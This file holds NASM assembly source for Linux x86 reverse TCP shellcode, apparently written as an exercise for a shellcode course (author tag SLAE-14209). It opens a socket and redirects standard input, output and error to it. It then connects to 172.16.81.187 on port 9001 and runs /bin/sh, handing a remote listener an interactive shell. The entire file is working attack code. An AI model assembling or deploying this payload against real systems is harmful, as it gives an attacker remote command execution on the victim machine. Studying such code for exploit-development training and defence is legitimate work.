; Filename: linux_x86_shell_reverse_tcp.nasm
; Author: SLAE-14209

global _start

section .text

_start:

; 1. syscall socket()

  xor eax, eax           ; zeroize EAX register
  xor ebx, ebx           ; zeroize EBX register
  xor ecx, ecx           ; zeroize ECX register
  xor edx, edx           ; zeroize EDX register
  
  mov ax, 0x167          ; syscall socket
  mov bl, 0x2            ; AF_INET = 2
  mov cl, 0x1            ; SOCKET_STREAM = 1
  int 0x80               ; interrupt vector
  mov edi, eax           ; storing EAX into EDI for future references
  
; 2. syscall dup2()

  mov cl, 0x3           ; counter = 3
  
  loop_dup2:
  xor eax, eax          ; zeroize because of placing dup2()
  mov al, 0x3f          ; syscall dup2()
  mov ebx, edi          ; reference on stored EDI
  dec cl                ; decrementing counter by 1
  int 0x80
  
  jnz loop_dup2         ; jmp not zero
  
; 3. syscall connect()
  
  xor eax, eax          ; zeroize EAX register
  mov ax, 0x16A         ; syscall connect()
  mov ebx, edi          ; reference to stored eax with socket()
  xor ecx, ecx          ; zeroize ECX register (=> sockaddr struct)
  push ecx              ; 0
  push dword 0xbb5110ac ; IP address 172.16.81.187 = 0xAC1051BB => little endian = 0xbb5110ac
  push word 0x2923      ; push port number 9001 (little endian)
  push word 0x2         ; push AF_INET 2
  mov ecx, esp          ; Stack Pointer -> ECX
  mov dl, 16            ; addrlen (EDX) = 16
  int 0x80
   
; 4. syscall execve()

  xor eax, eax          ; zeroize because of placing execve()
  push eax
  push 0x68732f6e       ; 'hs/n"
  push 0x69622f2f       ; 'ib//'
  mov ebx, esp          ; '//bin/sh' -> ESP
  
  push eax              ; push 0
  mov edx, esp
	
  push ebx
  mov ecx, esp
  mov al, 0xb           ; syscall execve()
  int 0x80
